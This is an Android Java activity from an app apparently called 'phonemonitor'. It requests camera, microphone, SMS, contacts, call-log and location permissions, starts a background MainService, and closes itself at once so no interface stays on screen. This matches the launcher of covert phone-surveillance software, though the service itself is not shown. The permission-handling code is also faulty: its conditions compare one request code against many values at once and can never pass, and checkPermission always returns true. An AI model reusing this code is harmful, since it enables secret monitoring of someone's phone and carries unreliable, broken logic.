package com.monitor.phone.s0ft.phonemonitor;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;

import static android.Manifest.permission.READ_SMS;

public class MainActivity extends Activity {

    private static final int MY_CAMERA_REQUEST_CODE = 100;
    private static final int MY_EXT_STORE_REQUEST_CODE = 101;
    private static final int MY_CALL_PHONE_REQUEST_CODE = 102;
    private static final int MY_READ_PHONE_REQUEST_CODE = 103;
    private static final int MY_READ_CONTACTS_REQUEST_CODE = 104;
    private static final int MY_RECEIVE_SMS_REQUEST_CODE = 105;
    private static final int MY_READ_SMS_REQUEST_CODE = 106;
    private static final int MY_READ_PHONE_NUMBERS_REQUEST_CODE = 107;
    private static final int MY_SEND_SMS_REQUEST_CODE = 108;
    private static final int MY_RECORD_AUDIO_REQUEST_CODE = 109;
    private static final int ACCESS_FINE_LOCATION_REQUEST_CODE = 110;


    boolean isRationale, isFirst;
    static int REQUEST_CODE_PERMISSIONS = 11;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        /*Intent intent=new Intent(this,MainService.class);
        startService(intent);
        finish();*/

        //askPermissions(true);
        //checkPermission();
        if (checkPermission()) {
            Intent intent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            //startService(intent);
            finish();
        }


    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    public boolean checkPermission() {

        String[] permissions = {Manifest.permission.CAMERA, Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CALL_PHONE, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS,
                Manifest.permission.RECEIVE_SMS, Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CALL_LOG, Manifest.permission.RECORD_AUDIO, READ_SMS,
                Manifest.permission.SEND_SMS, Manifest.permission.READ_PHONE_NUMBERS};

        if ((checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) &&
                (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)) {
            requestPermissions(permissions, REQUEST_CODE_PERMISSIONS);
        }

         /*   if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.CAMERA}, MY_CAMERA_REQUEST_CODE);
        }
        if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, MY_EXT_STORE_REQUEST_CODE);
        }
        if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.CALL_PHONE}, MY_CALL_PHONE_REQUEST_CODE);
        }
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE}, MY_READ_PHONE_REQUEST_CODE);
        }
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, MY_READ_CONTACTS_REQUEST_CODE);
        }

        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS}, MY_RECEIVE_SMS_REQUEST_CODE);
        }*/
        return true;
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        /*if (requestCode == REQUEST_CODE_PERMISSIONS) {
            Map<String, Integer> perms = new HashMap<String, Integer>();
            // Initial
            perms.put(Manifest.permission.WRITE_EXTERNAL_STORAGE, PackageManager.PERMISSION_GRANTED);
            perms.put(Manifest.permission.CALL_PHONE, PackageManager.PERMISSION_GRANTED);
            perms.put(Manifest.permission.READ_PHONE_STATE, PackageManager.PERMISSION_GRANTED);
            perms.put(Manifest.permission.READ_CONTACTS, PackageManager.PERMISSION_GRANTED);
            perms.put(Manifest.permission.RECEIVE_SMS, PackageManager.PERMISSION_GRANTED);
            // Fill with results
            for (int i = 0; i < permissions.length; i++) {
                perms.put(permissions[i], grantResults[i]);
            }
            // Check for ACCESS_FINE_LOCATION
            if (perms.get(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                    perms.get(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED &&
                    perms.get(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
                    perms.get(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                    perms.get(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED) {
                // All Permissions Granted
                //startActivity(new Intent(PermissionsActivity.this, SplashActivity.class));
                Intent intent=new Intent(this,MainService.class);
                startService(intent);
                finish();
            } else {
                // Permission Denied
                Toast.makeText(this, "Some Permission is Denied.", Toast.LENGTH_SHORT)
                        .show();
                isFirst = false;
                askPermissions(true);
            }
        }*/
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if ((requestCode == MY_CAMERA_REQUEST_CODE) && (requestCode == MY_EXT_STORE_REQUEST_CODE) &&
                (requestCode == MY_CALL_PHONE_REQUEST_CODE) && (requestCode == MY_READ_PHONE_REQUEST_CODE) &&
                (requestCode == MY_READ_CONTACTS_REQUEST_CODE) && (requestCode == MY_RECEIVE_SMS_REQUEST_CODE) &&
                (requestCode == MY_READ_SMS_REQUEST_CODE) && (requestCode == MY_READ_PHONE_NUMBERS_REQUEST_CODE) &&
                (requestCode == MY_SEND_SMS_REQUEST_CODE) && (requestCode == ACCESS_FINE_LOCATION_REQUEST_CODE) &&
                (requestCode == MY_RECORD_AUDIO_REQUEST_CODE)) {
            for (int grantResult : grantResults) {
                if (grantResult == PackageManager.PERMISSION_GRANTED) {
                    Intent intent = new Intent(this, MainService.class);
                    startService(intent);
                    finish();
                }
            }
        }


        // Check for ACCESS_FINE_LOCATION
      /*  if (requestCode == MY_CAMERA_REQUEST_CODE) {
            for(int i = 0 ; i<grantResults.length;i++){

            }
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "camera permission granted", Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "camera permission denied", Toast.LENGTH_LONG).show();
            }
        }*/
        // super.onRequestPermissionsResult(requestCode, permissions, grantResults);


    }

    private boolean hasPermissions() {
        int res;
        // list all permissions which you want to check are granted or not.
        String[] permissions = new String[]{Manifest.permission.CAMERA, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS, Manifest.permission.RECEIVE_SMS};
        for (String perms : permissions) {
            res = checkCallingOrSelfPermission(perms);
            if (!(res == PackageManager.PERMISSION_GRANTED)) {
                // it return false because your app dosen't have permissions.
                //askPermissions(true);
                return false;
            }

        }
        // it return true, your app has permissions.
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK) {

            if ((requestCode == MY_CAMERA_REQUEST_CODE) && (requestCode == MY_EXT_STORE_REQUEST_CODE) &&
                    (requestCode == MY_CALL_PHONE_REQUEST_CODE) && (requestCode == MY_READ_PHONE_REQUEST_CODE) &&
                    (requestCode == MY_READ_CONTACTS_REQUEST_CODE) && (requestCode == MY_RECEIVE_SMS_REQUEST_CODE) &&
                    (requestCode == MY_READ_SMS_REQUEST_CODE) && (requestCode == MY_READ_PHONE_NUMBERS_REQUEST_CODE) &&
                    (requestCode == MY_SEND_SMS_REQUEST_CODE) && (requestCode == ACCESS_FINE_LOCATION_REQUEST_CODE) &&
                    (requestCode == MY_RECORD_AUDIO_REQUEST_CODE)) {
                Intent intent = new Intent(this, MainService.class);
                startService(intent);
                finish();
            }
        }


        //askPermissions(true);
    }

    @Override
    protected void onStart() {
        super.onStart();
        finish();
    }

    @Override
    protected void onResume() {
        super.onResume();
        finish();
    }
}
